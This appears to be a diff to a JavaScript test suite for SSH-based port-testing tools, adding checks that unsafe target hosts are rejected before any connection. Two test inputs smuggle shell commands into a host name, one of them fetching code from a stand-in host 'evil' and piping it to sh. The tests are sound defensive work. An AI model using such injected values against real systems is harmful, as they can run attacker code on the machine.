@@ -4,9 +4,10 @@ import assert from 'assert';
 import { EventEmitter } from 'events';
 import {
   parseDnsOutput, parseTcpOutput, parseTlsOutput, parseHttpOutput,
-  buildDnsCommand, buildTlsCommand, buildHttpCommand,
+  buildDnsCommand, buildTcpCommand, buildTlsCommand, buildHttpCommand,
   handleSshPortTest,
 } from '../src/tools/port-test-tools.js';
+import { unwrapTimeout } from './util-timeout-unwrap.js';
 
 let passed = 0, failed = 0; const fails = [];
 async function test(name, fn) {
@@ -20,7 +21,9 @@ class FakeStream extends EventEmitter {
 }
 class FakeClient {
   constructor({ script } = {}) { this.script = script || (() => ({ stdout: '', code: 0 })); this.commands = []; this.streams = []; }
-  exec(cmd, cb) {
+  exec(rawCmd, cb) {
+    // Recover inner command from `timeout -k N N sh -c '<cmd>'` wrapper.
+    const cmd = unwrapTimeout(rawCmd);
     this.commands.push(cmd);
     const s = new FakeStream(); this.streams.push(s);
     setImmediate(() => {
@@ -120,6 +123,11 @@ await test('buildHttpCommand: other port -> http scheme', () => {
   assert(buildHttpCommand('example.com', 8080, 5000).includes('http://'));
 });
 
+await test('buildTcpCommand: valid host builds a probe; unsafe host throws', () => {
+  assert(buildTcpCommand('example.com', 80, 5000).includes('example.com'));
+  assert.throws(() => buildTcpCommand('x/$(touch /tmp/p)/y', 80, 5000), /unsafe host/);
+});
+
 // --- handleSshPortTest ---------------------------------------------------
 await test('handleSshPortTest: missing target_host -> structured fail', async () => {
   const r = await handleSshPortTest({
@@ -128,6 +136,17 @@ await test('handleSshPortTest: missing target_host -> structured fail', async ()
   });
   assert.strictEqual(r.isError, true);
   assert(r.content[0].text.includes('target_host is required'));
+});
+
+await test('handleSshPortTest: hostile target_host -> structured fail before connect', async () => {
+  let connected = false;
+  const r = await handleSshPortTest({
+    getConnection: async () => { connected = true; throw new Error('must not connect'); },
+    args: { server: 's', target_host: 'x/$(curl evil|sh)/y', target_port: 80, format: 'json' },
+  });
+  assert.strictEqual(r.isError, true);
+  assert(r.content[0].text.includes('target_host'));
+  assert.strictEqual(connected, false, 'rejected before any SSH connection');
 });
 
 await test('handleSshPortTest: full chain tcp+dns with scripted results', async () => {
